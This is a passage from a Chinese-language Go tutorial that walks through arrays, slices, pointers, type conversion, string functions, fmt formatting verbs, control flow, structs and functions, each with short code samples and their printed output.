fmt.Println(numbers[0]) // 输出第⼀个元素 } 输出：1 6.修改数组中的元素： 1 2 3 4 5 6 func main() { numbers := [...]int{1, 2, 3, 4, 5} numbers[1] = 10 // 修改第⼆个元素的值 fmt.Println(numbers) } 输出：[1 10 3 4 5] 7.数组⻓度 1 2 3 4 5 func main() { numbers := [...]int{1, 2, 3, 4, 5} fmt.Println(len(numbers)) // 输出数组的⻓度 } 输出：5 8.值类型 数组是值类型，这意味着当数组被赋值给另⼀个数组或作为参数传递时，会进⾏值拷⻉\n1 2 3 4 5 6 func main() { a := [3]int{1, 2, 3} b := a b[0] = 10 fmt.Println(a) // 输出 [1, 2, 3] fmt.Println(b) // 输出 [10, 2, 3]} 9.数组遍历 在数组中:\nfori\n1 2 3 4 5 6 7 8 9 10 11 func main() { numbers := [...]int{1, 2, 3, 4, 5} for i := 0; i \u0026lt; len(numbers); i++ { fmt.Println(numbers[i]) }} 输出： 1 2 3 4 5 forr\n1 2 3 4 5 6 7 8 9 10 11 func main() { numbers := [...]int{1, 2, 3, 4, 5} for _, number := range numbers { fmt.Println(number) }} 输出： 1 2 3 4 5 0x09 切片 1.定义切⽚ 切⽚是⼀个动态数组，可以在运⾏时改变⻓度。切⽚的定义语法如下：\n1 var sliceName []elementType 例如：\n1 var numbers []int 2.初始化切⽚ 字⾯量初始化：\n1 2 3 4 5 func main() { numbers := []int{1, 2, 3, 4, 5} fmt.Println(numbers) } 输出：[1 2 3 4 5] make 函数创建切⽚：\n1 2 3 4 5 6 7 8 9 10 numbers := make([]int, 5) // 创建⼀个⻓度和容量都为 5 的切⽚ func main() { ints := make([]int, 5) ints[0] = 1 ints[1] = 2 ints[2] = 3 fmt.Println(ints) } 输出：[1 2 3 0 0] 指定容量：\n1 2 3 4 5 6 7 8 9 numbers := make([]int, 5, 10) // 创建⼀个⻓度为 5，容量为 10 的切⽚ func main() { ints := make([]int, 2, 5) ints[0] = 1 ints[1] = 2 fmt.Println(ints) } 输出：[1 2] 3.切⽚的基本操作 访问和修改切⽚元素\n切⽚元素通过索引访问，索引从 0 开始：\n1 2 3 4 5 6 7 8 9 func main() { ints := []int{1, 2, 3, 4, 5} fmt.Println(ints[0]) //输出第一个元素 ints[1] = 10 //修改第二个元素的值 fmt.Println(ints[1]) } 输出： 1 10 获取切⽚⻓度和容量\n1 2 3 4 5 6 7 8 func main() { ints := []int{1, 2, 3, 4, 5} fmt.Println(len(ints)) //输出切片的长度 fmt.Println(cap(ints)) //输出切片的容量 } 输出： 5 5 4.切⽚的动态增⻓ 切⽚可以使⽤ append 函数动态增⻓\n1 2 3 4 5 6 func main() { ints := []int{1, 2, 3, 4, 5} ints = append(ints, 6, 7, 8) fmt.Println(ints) } 输出：[1 2 3 4 5 6 7 8] 5.切⽚的遍历 可以使⽤ for 循环或 range 关键字遍历切⽚\nfori\n1 2 3 4 5 6 7 8 9 10 11 func main() { ints := []int{1, 2, 3, 4, 5} for i := 0; i \u0026lt; len(ints); i++ { fmt.Println(ints[i]) }} 输出： 1 2 3 4 5 forr\n1 2 3 4 5 6 7 8 9 10 11 func main() { ints := []int{7, 2, 3, 4, 5} for _, i := range ints { fmt.Println(i) }} 输出： 7 2 3 4 5 6.切⽚与数组的区别 数组\n1 2 3 固定⻓度：数组的⻓度在声明时就确定了，不能动态改变。 值类型：数组是值类型，赋值或传参时会进⾏值拷⻉。、 性能：由于数组的⻓度固定，性能上会⽐切⽚更好。 切⽚\n1 2 3 动态⻓度：切⽚的⻓度可以动态改变，更加灵活。 引⽤类型：切⽚是引⽤类型，赋值或传参时不会进⾏值拷⻉，⽽是引⽤同⼀个底层数组。 内置函数⽀持：切⽚有很多内置函数⽀持，如 append、copy 等。 forr 与 fori 的区别 forr\n1 range 提供了⼀种简洁的⽅式来迭代数组、切⽚、映射和通道。使⽤ range 迭代数组时，它会返回两个值：索引和该索引处的值。这使得你可以直接访问数组的元素，⽽不需要显式地使⽤索引来访问。 fori\n1 传统的 for 循环不会⾃动解包数组的值，因此需要使⽤索引来访问数组的元素 0x10 指针 1.指针基础知识 指针的定义：\n1 2 3 4 5 6 7 跟\u0026amp;， \u0026amp;是取⼀个变量的内存地址，* 是指向这个地址的值，也就是解引⽤ \u0026amp; 符号：取地址，⽤于获取变量的内存地址。 ** 符号：解引⽤，⽤于访问指针指向的变量的值。 指针的声明和初始化： var ptr *int // 声明⼀个指向int类型的指针 var x int = 10 ptr = \u0026amp;x // ptr现在指向x的地址 指针的解引⽤\n使⽤ * 操作符来访问指针指向的变量的值。\n1 fmt.Println(*ptr) // 输出10 详解：\n1 2 3 4 5 6 7 *是解引用，\u0026amp;是取地址 * 0xc00000e028 --\u0026gt;\u0026gt; 10 \u0026amp; 0xc00000e030 \u0026lt;\u0026lt;-- 11 举例：\n\u0026amp;-\u0026gt;取地址\n1 2 3 4 5 func main() { a := 10 fmt.Println(\u0026amp;a) } 输出：0x140a0d8 *-\u0026gt;空指针\n1 2 3 4 5 func main() { var b *int fmt.Println(b) } 输出：\u0026lt;nil\u0026gt; 然后取a的地址赋值给b，解引用b得到b的值\n1 2 3 4 5 6 7 func main() { a := 10 var b *int b = \u0026amp;a fmt.Println(*b) } 输出：10 指针的使⽤场景\n1 2 **函数参数传递** 使⽤指针可以避免在函数调⽤时复制⼤块数据，提⾼效率 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import \u0026#34;fmt\u0026#34; func Updata(a *int) { //定义一个Updata方法,传入一个int型指针 *a = 100 } func b() { //这里定义一个b方法进行测试使用。 var a int = 10 fmt.Println(\u0026#34;a=\u0026#34;, a) //输出10 Updata(\u0026amp;a) fmt.Println(\u0026#34;a=\u0026#34;, a) //使用Updata方法，将a的地址传进去，然后Updata将a的地址进行修改。就变成了100 } func main() { b() } 2.结构体指针 使⽤指针可以直接修改结构体的字段\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; type Test struct { //定义一个结构化指针 i int s string } func main() { t := \u0026amp;Test{ i: 1, s: \u0026#34;2\u0026#34;, } fmt.Println(*t) } 输出：{1 2} 3.指针的注意事项 空指针\n指针在未初始化时默认为 nil，使⽤前需要检查。\n1 2 3 4 var ptr *int if ptr != nil { fmt.Println(*ptr) } 指针运算\nGo 语⾔不⽀持指针运算（如 C 语⾔中的指针加减运算）\n0x11 类型转换 1.基本概念 1 2 类型转换是将⼀种数据类型的值转换为另⼀种数据类型的值。 Go 语⾔是强类型语⾔，不同类型之间不能直接进⾏赋值或运算，必须通过显式的类型转换。 2.语法 T 是⽬标类型。\nv 是要转换的值。\n1 T(v) 3.常⻅的类型转换 浮点数类型之间的转换 1 2 3 4 5 func main() { i := 3.14 fmt.Println(int(i)) } 输出；3 注：浮点数转换为整数时，⼩数部分会被舍弃\n整数类型之间的转换 1 2 3 var i int = 42 var f float64 = float64(i) var u uint = uint(i) 字符串和字节切⽚之间的转换 示例：\n1 2 3 4 5 6 7 8 func main() { s := \u0026#34;hello\u0026#34; //字符串 b := []byte(s) //转换成字符切片 fmt.Println(b) //[104 101 108 108 111] b[0] = \u0026#39;H\u0026#39; //将b[0]号位,转换成大写的H fmt.Println(b) //[72 101 108 108 111] fmt.Println(string(b)) //然后在转过来，输出：Hello } 0x12 Golang 包 导⼊\n在 Go 语⾔中，导⼊包使⽤ import 关键字。可以导⼊标准库包，也可以导⼊⾃定义包。\n1 2 import \u0026#34;fmt\u0026#34; import \u0026#34;math\u0026#34; 导⼊多个包\n1 2 3 4 import ( \u0026#34;fmt\u0026#34; \u0026#34;math\u0026#34; ) 别名导⼊\n可以为导⼊的包指定⼀个别名，这样在使⽤包中的内容时可以使⽤别名：\n1 2 3 4 5 6 7 8 9 10 11 12 package main import ( f \u0026#34;fmt\u0026#34; //起个别名：f m \u0026#34;math\u0026#34; ) func main() { f.Println(\u0026#34;Hello, World!\u0026#34;) result := m.Sqrt(16) f.Println(result) } 导出名称\n1 在Go语⾔中，包中的标识符（变量、常量、类型、函数等）如果⾸字⺟⼤写，则表示该标识符是导出的，可以被其他包访问；如果⾸字⺟⼩写，则表示该标识符是未导出的，只能在包内访问。 空⽩标识符导⼊\n有时需要导⼊⼀个包，但不直接使⽤包中的任何标识符。这种情况下可以使⽤空⽩标识符 _ ：\n1 2 3 import ( _ \u0026#34;fmt\u0026#34; ) 0x13 字符串 1.字符串基础 字符串类型：\n1 2 在 Go 中，字符串是不可变的字节序列。 字符串类型是 string。 字符串字⾯量：\n1 2 双引号：\u0026#34;Hello, World!\u0026#34; 反引号：`Hello, World!`，⽤于多⾏字符串和包含特殊字符的字符串。 2.字符串函数 Contains 检查字符串是否包含⼦字符串。\n1 2 3 4 5 6 7 8 9 10 11 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { fmt.Println(strings.Contains(\u0026#34;hello,word!\u0026#34;, \u0026#34;hello\u0026#34;)) //主要是对 hello,word!是否含有hello，如果有则是true，如果没有则是false，也区分大小写，完全匹配才行。 } 输出：true 一般写POC，举例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/imroc/req/v3\u0026#34; \u0026#34;strings\u0026#34; ) func main() { client := req.C() reps, err := client.R().Get(\u0026#34;http://www.baidu.com\u0026#34;) if err != nil { panic(err) } if strings.Contains(reps.String(), \u0026#34;virus-2020-clicked\u0026#34;) { //这句话的意思是相应包里是否含有virus-2020-clicked字符串，如果含有则返回Success如果不含有则返回Failed fmt.Println(\u0026#34;Success\u0026#34;) } else { fmt.Println(\u0026#34;Failed\u0026#34;) } } 输出：Success ContainsAny 检查字符串是否包含任何⼀个给定字符。\n1 2 3 4 5 6 7 8 9 func main() { if strings.ContainsAny(\u0026#34;hello word\u0026#34;, \u0026#34;weo\u0026#34;) { //检查某个字符，hello word是否含有weo字符，如果含有则返回Success fmt.Println(\u0026#34;Success\u0026#34;) } else { fmt.Println(\u0026#34;Failed\u0026#34;) } } 输出：Success ContainsRune 检查字符串是否包含指定的 rune 字符。\n1 2 3 4 5 6 7 8 9 func main() { if strings.ContainsRune(\u0026#34;hello word\u0026#34;, \u0026#39;h\u0026#39;) { //检查某个字符，hello word是否含有w字符，如果含有则返回Success fmt.Println(\u0026#34;Success\u0026#34;) } else { fmt.Println(\u0026#34;Failed\u0026#34;) } } 输出：Success Count 计算⼦字符串在字符串中出现的次数。\n1 2 3 4 func main() { fmt.Println(strings.Count(\u0026#34;hellohhhhhhhhh\u0026#34;, \u0026#34;h\u0026#34;)) } 输出：10 EqualFold 忽略⼤⼩写⽐较两个字符串是否相等。\n1 2 3 4 func main() { fmt.Println(strings.EqualFold(\u0026#34;Go\u0026#34;, \u0026#34;go\u0026#34;)) } 输出：true Fields 将字符串按空⽩字符分割成切⽚。\n1 2 3 4 func main() { fmt.Println(strings.Fields(\u0026#34;hello world\u0026#34;)) } 输出：[hello world] HasPrefix 检查字符串是否以指定前缀开头。\n1 2 3 4 func main() { fmt.Println(strings.HasPrefix(\u0026#34;Hello word!!!\u0026#34;, \u0026#34;hello\u0026#34;)) } 输出：false 区分大小写。 HasSuffix 检查字符串是否以指定后缀结尾。\n1 2 3 4 func main() { fmt.Println(strings.HasSuffix(\u0026#34;Hello word\u0026#34;, \u0026#34;word\u0026#34;)) } 输出：true Index 返回⼦字符串在字符串中第⼀次出现的位置。\n1 2 3 4 func main() { fmt.Println(strings.Index(\u0026#34;hello world\u0026#34;, \u0026#34;world\u0026#34;)) } 输出：6 注意事项 ⼤⼩写敏感：⼤多数函数都是⼤⼩写敏感的，如 Contains 、 Index 等。 空字符串处理：某些函数在处理空字符串时会返回特定结果，如 Split 会返回包含⼀个空字符串的切⽚。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 函数 函数作⽤ Contains：检查字符串是否包含⼦字符串 ContainsAny：检查字符串是否包含任何⼀个给定字符 ContainsRune：检查字符串是否包含指定的 rune 字符 Count：计算⼦字符串在字符串中出现的次数 EqualFold：忽略⼤⼩写⽐较两个字符串是否相等 Fields：将字符串按空⽩字符分割成切⽚ HasPrefix：检查字符串是否以指定前缀开头 HasSuffix：检查字符串是否以指定后缀结尾 Index：返回⼦字符串在字符串中第⼀次出现的位置 IndexAny：返回字符串中任意⼀个字符第⼀次出现的位置 IndexByte：返回指定字节在字符串中第⼀次出现的位置 IndexRune：返回指定 rune 字符在字符串中第⼀次出现的位置 Join：将字符串切⽚⽤指定分隔符连接成⼀个字符串 LastIndex：返回⼦字符串在字符串中最后⼀次出现的位置 LastIndexAny：返回字符串中任意⼀个字符最后⼀次出现的位置 Repeat：重复字符串指定次数 Replace：替换字符串中的⼦字符串 ReplaceAll：替换字符串中的所有⼦字符串 Split：将字符串按指定分隔符分割成切⽚ SplitAfter：将字符串按指定分隔符分割成切⽚，保留分隔符 SplitAfterN：将字符串按指定分隔符分割成切⽚，保留分隔符，最多分割 N 次 SplitN：将字符串按指定分隔符分割成切⽚，最多分割 N 次 Title：将字符串的每个单词的⾸字⺟⼤写 ToLower：将字符串转换为⼩写 ToUpper：将字符串转换为⼤写 Trim：去除字符串两端的指定字符 TrimSpace：去除字符串两端的空⽩字符 TrimPrefix：去除字符串前缀 TrimSuffix：去除字符串后缀 NewReplacer：创建⼀个字符串替换器 0x14 字符串格式化 1.Fmt fmt.Print\n常⻅占位符 %v：值的默认格式表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%v: %v\\n\u0026#34;, 123) } 输出：%v: 123 %+v：类似%v，但会添加字段名（结构体）\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%+v: %+v\\n\u0026#34;, struct{ Name string }{\u0026#34;Alice\u0026#34;}) } 输出：%+v: {Name:Alice} %#v：值的Go语法表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%#v: %#v\\n\u0026#34;, struct{ Name string }{\u0026#34;Alice\u0026#34;}) } 输出：%#v: struct { Name string }{Name:\u0026#34;Alice\u0026#34;} %T：值的类型\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%T: %T\\n\u0026#34;, 123) } 输出：%T: int % %：百分号本身\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%%%: %%\\n\u0026#34;) } 输出：%%: % 布尔值 %t：单词true或false\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%t: %t\\n\u0026#34;, true) } 输出：true 整数 %b：⼆进制表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%b: %b\\n\u0026#34;, 123) } 输出：%b: 1111011 %c：相应Unicode码点表示的字符\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%c: %c\\n\u0026#34;, 65) } 输出：%c: A %d：⼗进制表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%d: %d\\n\u0026#34;, 123) } 输出：%d: 123 %o：⼋进制表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%o: %o\\n\u0026#34;, 123) } 输出：%o: 173 %O：带0o前缀的⼋进制表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%O: %O\\n\u0026#34;, 123) } 输出：%O: 0o173 %q：单引号围绕的字符字⾯值，必要时会采⽤转义表示\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%q: %q\\n\u0026#34;, 65) } 输出：%q: \u0026#39;A\u0026#39; %x：⼗六进制表示，使⽤a-f\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%x: %x\\n\u0026#34;, 123) } 输出：%x: 7b %X：⼗六进制表示，使⽤A-F\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%X: %X\\n\u0026#34;, 123) } 输出：%X: 7B %U：Unicode格式：U+1234，等同于\u0026quot;U+%04X\u0026quot;\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%U: %U\\n\u0026#34;, 123) } 输出：%U: U+007B 浮点数和复数 %b：⽆⼩数部分的指数为⼆的幂的科学计数法，如-123456p-78\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%b: %b\\n\u0026#34;, 123.456) } 输出：%b: 8687443681197687p-46 %e：科学计数法，如-1234.456e+78\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%e: %e\\n\u0026#34;, 123.456) } 输出：%e: 1.234560e+02 %E：科学计数法，如-1234.456E+78\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%E: %E\\n\u0026#34;, 123.456) } 输出：%E: 1.234560E+02 %f：有⼩数点⽽⽆指数，如123.456\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%f: %f\\n\u0026#34;, 123.456) } 输出：%f: 123.456000 %F：等同于%f\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%F: %F\\n\u0026#34;, 123.456) } 输出：%F: 123.456000 %g：根据实际情况采⽤%e或%f格式（以获得更紧凑、准确的输出）\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%g: %g\\n\u0026#34;, 123.456) } 输出：%g: 123.456 %G：根据实际情况采⽤%E或%F格式（以获得更紧凑、准确的输出）\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%G: %G\\n\u0026#34;, 123.456) } 输出：%G: 123.456 字符串和字节切⽚ %s：解析变量，直接打印值\n1 2 3 4 5 func main() { name := \u0026#34;Go\u0026#34; fmt.Printf(\u0026#34;Hello, %s!\\n\u0026#34;, name) } 输出：Hello, Go! %q：打印值的时候加上双引号\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%q: %q\\n\u0026#34;, \u0026#34;hello\u0026#34;) } 输出：%q: \u0026#34;hello\u0026#34; %x：每个字节⽤两字符⼗六进制数表示（使⽤a-f）\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%x: %x\\n\u0026#34;, \u0026#34;hello\u0026#34;) } 输出：%x: 68656c6c6f %X：每个字节⽤两字符⼗六进制数表示（使⽤A-F）\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%X: %X\\n\u0026#34;, \u0026#34;hello\u0026#34;) } 输出：%X: 68656C6C6F 指针 %p：⼗六进制表示，前缀0x\n1 2 3 4 func main() { fmt.Printf(\u0026#34;%%p: %p\\n\u0026#34;, \u0026amp;struct{}{}) } 输出：%p: 0xacdd40 注意事项：\n1 注意⼤⼩写区分 2.fmt.Scanf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func main() { var ( name string age int score float64 ) fmt.Println(\u0026#34;请输⼊你的名字、年龄和分数（例如：张三 25 89.5）：\u0026#34;) _, err := fmt.Scanf(\u0026#34;%s %d %f\u0026#34;, \u0026amp;name, \u0026amp;age, \u0026amp;score) if err != nil { fmt.Println(\u0026#34;输⼊错误：\u0026#34;, err) return } fmt.Printf(\u0026#34;名字：%s\\n\u0026#34;, name) // %s 表示字符串 fmt.Printf(\u0026#34;年龄：%d\\n\u0026#34;, age) // %d 表示整数 fmt.Printf(\u0026#34;分数：%.2f\\n\u0026#34;, score) // %.2f 表示保留两位⼩数的浮点数 } 输出： 请输⼊你的名字、年龄和分数（例如：张三 25 89.5）： 李勐 23 23 名字：李勐 年龄：23 分数：23.00 注意事项：\n1 2 Scanf如果是单次获取多个值，使⽤空格隔开，并⾮回⻋ fmt.Scanf 的格式化字符串中，逗号（,）会被视为输⼊的⼀部分，因此⽤户在输⼊时需要包含逗号。使⽤空格作为分隔符。 0x15 条件控制 1.if 语法：\n1 2 3 if condition { // 执⾏的代码 } 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package main import \u0026#34;fmt\u0026#34; func main() { x := 10 // 基本的if语句 if x \u0026gt; 5 { fmt.Println(\u0026#34;x⼤于5\u0026#34;) } // if-else语句 if x \u0026gt; 15 { fmt.Println(\u0026#34;x⼤于15\u0026#34;) } else { fmt.Println(\u0026#34;x不⼤于15\u0026#34;) } // if-else if-else语句 if x \u0026lt; 5 { fmt.Println(\u0026#34;x⼩于5\u0026#34;) } else if x == 10 { fmt.Println(\u0026#34;x等于10\u0026#34;) } else { fmt.Println(\u0026#34;x⼤于5且不等于10\u0026#34;) } // 带初始化语句的if if y := 20; y \u0026gt; x { fmt.Println(\u0026#34;y⼤于x\u0026#34;) } else { fmt.Println(\u0026#34;y不⼤于x\u0026#34;) } } 输出： x⼤于5 x不⼤于15 x等于10 y⼤于x 注意事项：\n1 2 3 4 5 6 7 8 基本的if语句：⽤于判断条件是否为真，如果为真则执⾏代码块内容。 if-else语句：在条件为假时执⾏else代码块。 if-else if-else语句：⽤于多个条件的判断。 带初始化语句的if：可以在if语句中初始化⼀个变量，但该变量的作⽤域仅限于if语句块内。 Go语⾔中的if语句不需要括号包围条件表达式。 if语句中的初始化语句和条件表达式之间⽤分号分隔。 if语句块中的变量作⽤域仅限于该语句块内。 2.Switch 基本示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import \u0026#34;fmt\u0026#34; func main() { day := \u0026#34;Tuesday\u0026#34; switch day { case \u0026#34;Monday\u0026#34;: fmt.Println(\u0026#34;今天是星期⼀\u0026#34;) case \u0026#34;Tuesday\u0026#34;: fmt.Println(\u0026#34;今天是星期⼆\u0026#34;) case \u0026#34;Wednesday\u0026#34;: fmt.Println(\u0026#34;今天是星期三\u0026#34;) default: fmt.Println(\u0026#34;其他⽇⼦\u0026#34;) }} 输出：今天是星期⼆ 多个条件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import \u0026#34;fmt\u0026#34; func main() { day := \u0026#34;Saturday\u0026#34; switch day { case \u0026#34;Monday\u0026#34;, \u0026#34;Tuesday\u0026#34;, \u0026#34;Wednesday\u0026#34;, \u0026#34;Thursday\u0026#34;, \u0026#34;Friday\u0026#34;: fmt.Println(\u0026#34;⼯作⽇\u0026#34;) case \u0026#34;Saturday\u0026#34;, \u0026#34;Sunday\u0026#34;: fmt.Println(\u0026#34;周末\u0026#34;) default: fmt.Println(\u0026#34;⽆效的⽇⼦\u0026#34;) } } 输出：周末 3.For Go语⾔中的for循环有三种基本形式：\n1 2 3 经典形式：类似于C语⾔的for循环。 条件形式：只有⼀个条件表达式。 ⽆限循环：没有条件表达式。 经典形式\n1 2 3 for 初始化语句; 条件表达式; 后置语句 { // 循环体 } 示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import \u0026#34;fmt\u0026#34; func main() { for i := 0; i \u0026lt; 5; i++ { fmt.Println(i) } } 输出： 0 1 2 3 4 条件形式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { i := 0 for i \u0026lt; 5 { fmt.Println(i) i++ }} 输出： 0 1 2 3 4 4.range关键字 遍历数组、切⽚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { arr := []int{1, 2, 3, 4, 5} for index, value := range arr { fmt.Printf(\u0026#34;Index: %d, Value: %d\\n\u0026#34;, index, value) } } 输出： Index: 0, Value: 1 Index: 1, Value: 2 Index: 2, Value: 3 Index: 3, Value: 4 Index: 4, Value: 5 遍历映射 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { m := map[string]int{\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} for key, value := range m { fmt.Printf(\u0026#34;Key: %s, Value: %d\\n\u0026#34;, key, value) } } 输出： Key: a, Value: 1 Key: b, Value: 2 Key: c, Value: 3 遍历字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import \u0026#34;fmt\u0026#34; func main() { str := \u0026#34;hello\u0026#34; for index, char := range str { fmt.Printf(\u0026#34;Index: %d, Char: %c\\n\u0026#34;, index, char) }} 输出： Index: 0, Char: h Index: 1, Char: e Index: 2, Char: l Index: 3, Char: l Index: 4, Char: o 遍历通道 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package main import \u0026#34;fmt\u0026#34; func main() { ch := make(chan int, 5) ch \u0026lt;- 1 ch \u0026lt;- 2 ch \u0026lt;- 3 close(ch) for value := range ch { fmt.Println(value) } } 输出： 1 2 3 5.break和continue 1 2 3 break：⽤于退出循环。 continue：⽤于跳过当前循环的剩余部分，直接进⼊下⼀次循环。 break 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import \u0026#34;fmt\u0026#34; func main() { for i := 0; i \u0026lt; 10; i++ { if i == 5 { break } fmt.Println(i) } } 输出： 0 1 2 3 4 continue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import \u0026#34;fmt\u0026#34; func main() { for i := 0; i \u0026lt; 10; i++ { if i == 5 { continue } fmt.Println(i) } } 输出： 0 1 2 3 4 6 7 8 9 0x16 结构体\u0026amp;Maps 1.定义结构体 结构体是由⼀系列具有相同类型或不同类型的数据构成的数据集合。结构体是Go语⾔中⼀种重要的数据类型。\n1 2 3 4 type Person struct { Name string Age int } 2.结构体字⾯量 结构体字⾯量⽤于创建结构体实例。\n1 2 p1 := Person{Name: \u0026#34;Alice\u0026#34;, Age: 30} p2 := Person{\u0026#34;Bob\u0026#34;, 25} // 省略字段名 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import \u0026#34;fmt\u0026#34; type Person struct { Name string Age int } func main() { person1 := Person{Name: \u0026#34;John\u0026#34;, Age: 25} person2 := Person{Name: \u0026#34;Jane\u0026#34;, Age: 35} fmt.Println(person1) fmt.Println(person2) } 输出： {John 25} {Jane 35} 3.访问和修改结构体字段 可以通过点操作符访问和修改结构体字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import \u0026#34;fmt\u0026#34; type Person struct { Name string Age int } func main() { p := Person{Name: \u0026#34;Alice\u0026#34;, Age: 30} fmt.Println(p.Name) // 输出: Alice p.Age = 31 fmt.Println(p.Age) // 输出: 31 } 4.结构体嵌套 结构体可以嵌套，即⼀个结构体可以包含另⼀个结构体作为字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import \u0026#34;fmt\u0026#34; type Address struct { City, State string } type Person struct { Name string Age int Address Address } func main() { p := Person{ Name: \u0026#34;Alice\u0026#34;, Age: 30, Address: Address{ City: \u0026#34;New York\u0026#34;, State: \u0026#34;NY\u0026#34;, }, } fmt.Println(p.Address.City) // 输出: New York } 5.结构体与maps 可以使⽤结构体作为map的值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; type Person struct { Name string Age int } func main() { people := map[string]Person{ \u0026#34;Alice\u0026#34;: {Name: \u0026#34;Alice\u0026#34;, Age: 30}, \u0026#34;Bob\u0026#34;: {Name: \u0026#34;Bob\u0026#34;, Age: 25}, } fmt.Println(people[\u0026#34;Alice\u0026#34;].Age) // 输出: 30 } 6.指向结构体的指针 可以创建指向结构体的指针，并通过指针访问和修改结构体字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; type Person struct { Name string Age int } func main() { p := Person{Name: \u0026#34;Alice\u0026#34;, Age: 30} pPtr := \u0026amp;p fmt.Println(pPtr.Name) // 输出: Alice pPtr.Age = 31 fmt.Println(p.Age) // 输出: 31 } 7.⽅法与结构体 可以为结构体定义⽅法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import \u0026#34;fmt\u0026#34; type User struct { Name string Age int } func (U User) GetName() { fmt.Println(U.Name, U.Age) } func main() { user := User{} user.Name = \u0026#34;John\u0026#34; user.Age = 25 user.GetName() //输出：John 25 } 8.结构体⽅法中的指针接收者 使⽤指针接收者可以修改结构体的字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import \u0026#34;fmt\u0026#34; type User struct { Name string Age int } func (U *User) GetName() { U.Age++ } func main() { u := User{\u0026#34;John\u0026#34;, 23} fmt.Println(u) //输出：{John 23} u.GetName() //输出：{John 24} fmt.Println(u) } 9.匿名结构体 匿名结构体是⼀种不需要事先定义类型的结构体。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func main() { p := struct { Name string Age int }{ Name: \u0026#34;Alice\u0026#34;, Age: 30, } fmt.Println(p.Name) // 输出: Alice } 0x17 函数 多参数\n1 2 3 4 5 6 7 8 9 10 11 package main import \u0026#34;fmt\u0026#34; func add(a int, b int) int { return a + b } func main() { result := add(3, 4) fmt.Println(result) // 输出: 7 } 多返回值\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; func divide(a int, b int) (int, int) { quotient := a / b remainder := a % b return quotient, remainder } func main() { q, r := divide(10, 3) fmt.Println(q, r) // 输出: 3 1 } 匿名函数\n1 2 3 4 5 6 7 8 9 package main import \u0026#34;fmt\u0026#34; func main() { func(msg string) { fmt.Println(msg) }(\u0026#34;Hello, World!\u0026#34;) // 输出: Hello, World! } 初始化函数\n1 2 3 4 5 6 7 8 9 10 package main import \u0026#34;fmt\u0026#34; func init() { fmt.Println(\u0026#34;初始化函数\u0026#34;) } func main() { fmt.Println(\u0026#34;主函数\u0026#34;) } 可变参数函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import \u0026#34;fmt\u0026#34; func sum(nums ...int) int { total := 0 for _, num := range nums { total += num } return total } func main() { result := sum(1, 2, 3, 4) fmt.Println(result) // 输出: 10 } 命名返回值\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import \u0026#34;fmt\u0026#34; func swap(a, b int) (x int, y int) { x = b y = a return } func main() { a, b := swap(1, 2) fmt.Println(a, b) 